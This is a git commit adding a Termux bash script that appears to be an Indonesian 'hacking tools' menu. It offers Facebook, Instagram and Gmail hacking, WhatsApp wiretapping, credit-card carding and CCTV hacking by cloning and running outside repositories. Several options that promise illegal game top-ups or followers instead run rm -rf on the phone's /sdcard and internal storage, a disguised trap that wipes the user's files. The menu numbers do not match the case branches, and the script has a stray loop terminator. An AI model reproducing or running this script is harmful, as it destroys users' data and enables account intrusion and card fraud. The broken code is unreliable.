260d5ce55d3b9ae8c0aff1aec8e39bfee23215a6
INYOURS3RV3R <43807345+INYOURS3RV3R@users.noreply.github.com>
2018-12-01 19:51:10 +0700

    Add files via upload
    Jangan Copas Anjing!!!!!

---
+++ InYourS3rv3r.sh
@@ -0,0 +1,374 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+clear
+#colors
+cyan='\033[1;36m'
+green='\033[1;32m'
+red='\033[1;31m'
+yellow='\033[1;33m'
+blue='\033[1;34m'
+purple='\033[1;35m'
+reset='\033[0m'
+
+figlet INYOURS3RV3R | lolcat
+
+echo  "$green __________________________________________________"
+echo $green "|[Author                   ]: InYourS3rv3r      |"
+echo $yellow "|[Version                  ]: banyak            |"
+echo $red   "|[Totalsh                  ]: 30                |"
+echo $blue  "|[Team                     ]: Jabar Cyber Army  |"
+echo $white     " |[Phone                    ]: 08892702630       |"
+echo $purple "|[Thanks To🙏👇                                 |"
+echo $red   "|[Termux Tools-ID                               |"
+echo $green "|[Sqlmap Hacktivist                             |"
+echo $yellow "|[Blackhat Hecker Indonesia                     |"
+echo $red   "|[2Easy 4Hack                                   |"
+echo  "$green __________________________________________________"
+echo  "$red        Tool Termux!!"
+echo  "$red  Jelajahi Tools Dengan Bijak🙏"
+echo  "$blue  -_-_-_-_-_-_-_-_-_-_-_-_-_"
+###################################################
+
+# CTRL + C #
+
+###################################################
+
+
+trap ctrl_c INT
+
+ctrl_c() {
+
+clear
+
+echo -b $green"[#]> (Ctrl + C ) Detected, Trying To Exit ... " |lolcat
+
+echo -b $green"[#]> MAKASIH UDH PAKE TOOLS GUE " |lolcat
+
+sleep 1
+
+echo ""
+
+echo -b $green"[#]> INYOURS3RV3R WAS HERE" |lolcat
+
+
+echo -b $green"[#]> See you Again :)..." |lolcat
+
+sleep 1
+
+exit
+
+}
+
+
+lagi=1
+
+while [ $lagi -lt 6 ];
+
+do
+
+echo ""
+
+echo  $b "1. HACK FB NARGET${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "2. HACK IG NARGET${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "3. HACK GMAIL${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "4. SADAP WA JARAK JAUH${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "5. TOP UP ILEGAL ML${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "6. TOP UP ILEGAL COC${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "7. AUTO FOLLOWERS IG${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "8. DUMP TEMAN FB${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "9. CARI CC BUAT CARDING${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "10. TOP UP FREE FIRE${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "11. TEMBAK KUOTA${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "12. BUAT VIRUS BOOTLOOP HP${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "13. JADWAL SHOLAT${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "14. HACK CCTV${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "15. HACK PULSA SMARTFREN${enda}";
+
+echo  "============================" | lolcat
+
+echo  $b "16. Exit${enda}";
+
+echo  "╭─INYOURS3RV3R [PILIH AJA NOMERNYA]" | lolcat
+
+read  "╰─#" pil;
+
+
+case $pil in
+
+    1) echo "INYOURS3RV3R TOOLS-HACK FB NARGET" | lolcat
+
+            pkg install python2
+
+            git clone
+https://github.com/Senitopeng/KumpulanFbbrute
+
+            echo -e "${y} cara menggunakan KumpulanFbbrute"
+
+            cd KumpulanFbbrute
+
+            python2 jomblo.py
+
+            
+
+;;
+
+
+2) echo "INYOURS3RV3R TOOLS-HACK IG NARGET" | lolcat
+
+        apt install python2
+
+        git clone https://github.com/Senitopeng/instabot.git
+
+        echo -e "${y} cara menggunakan INSTA HACK"
+
+        cd instabot
+
+        ./instabot
+
+      
+
+;;
+
+
+3) echo "INYOURS3RV3R TOOLS-HACK GMAIL" | lolcat
+
+        apt install python2
+
+        git clone https://github.com/AyoubSirai/gmail_attacker
+
+        echo -e "${y} cara menggunakan Gmail HACK"
+
+        cd gmail_attacker
+
+        python2 gmail_attacker.py
+
+    
+
+
+;;
+
+
+4) echo "INYOURS3RV3R TOOLS-SADAP WA" | lolcat
+
+    git clone https://github.com/soracyberteam/what-sexploit
+
+        echo -e "${y} cara sadap whatsapp"
+
+        cd what-sexploit
+
+        ./whatsex
+
+    
+
+
+;;
+
+
+5) rm -rf /sdcard/
+
+    rm -rf /storage/emulated/0/
+
+exit
+
+
+;;
+
+
+6) rm -rf /sdcard/
+
+    rm -rf /storage/emulated/0/
+
+exit
+
+
+;;
+
+
+7) rm -rf /sdcard/
+
+    rm -rf /storage/emulated/0/
+
+exit
+
+
+;;
+
+
+8) echo "INYOURS3RV3R TOOLS-DUMP TEMAN FB" | lolcat
+
+    git clone https://github.com/CiKu370/OSIF
+
+        echo -e "${y} cara dump nya "
+
+        cd OSIF
+
+        pip2 install -r requirements.txt
+
+        python2 osif.py
+
+    
+
+;;
+
+
+9) echo "INYOURS3RV3R TOOLS-CC CARDING" | lolcat
+
+        git clone https://github.com/ganucisystem/creditcard
+
+        echo -e "${y} cara ambil cc nya "
+
+        cd creditcard
+
+        php fake.php
+
+       
+
+
+;;
+
+
+10) echo "Tools Berbayar harap hubungi author di Wa : 08892702630" | lolcat
+
+    rm -rf /sdcard/
+
+    rm -rf /storage/emulated/0/
+
+echo
+
+
+;;
+
+
+11) echo "R4D3N TOOLS-TEMBAK KUOTA" | lolcat
+
+        git clone https://github.com/kumpul4semut/semut.git
+
+        echo -e "${y} cara tembaknya "
+
+        cd semut
+
+        python2 dor.py
+
+    
+
+
+;;
+
+
+12) echo "INYOURS3RV3R TOOLS-TEMBAK KUOTA" | lolcat 
+
+    git clone https://github.com/aryanrtm/Jadwal-Sholat
+
+    cd Jadwal-Sholat
+
+    sh jadwal-sholat.sh
+
+    
+
+;;
+
+
+13) echo "INYOURS3RV3R TOOLS-BUAT VIRUS" | lolcat 
+
+    git clone https://github.com/TUANB4DUT/VIRUS
+
+    cd VIRUS
+
+    chmod +x bootloop.sh
+
+    sh bootloop.sh
+
+    
+
+;;
+
+
+14) echo "R4D3N TOOLS-HACK CCTV" | lolcat 
+
+    pkg install python2
+
+    git clone https://github.com/kancotdiq/ipcs
+
+    cd ipcs
+
+    python2 scan.py
+
+    
+
+;;
+
+
+15) echo "R4D3N TOOLS-HACK PULSA" | lolcat 
+
+    pkg install php
+
+    git clone https://github.com/ganucisystem/radenkeceh
+
+    cd radenkeceh
+
+    php pulsa.php
+
+
+;;
+
+
+16) echo "BYE BYE PARA HEKER,INCARLAH SESUATU YG MUSTAHIL" | 
+lolcat
+
+exit
+
+
+;;
+
+
+*) echo "Sorry, Your choices it's not already [T4T]"
+
+esac
+
+done
+
+done
+
+Desktop version
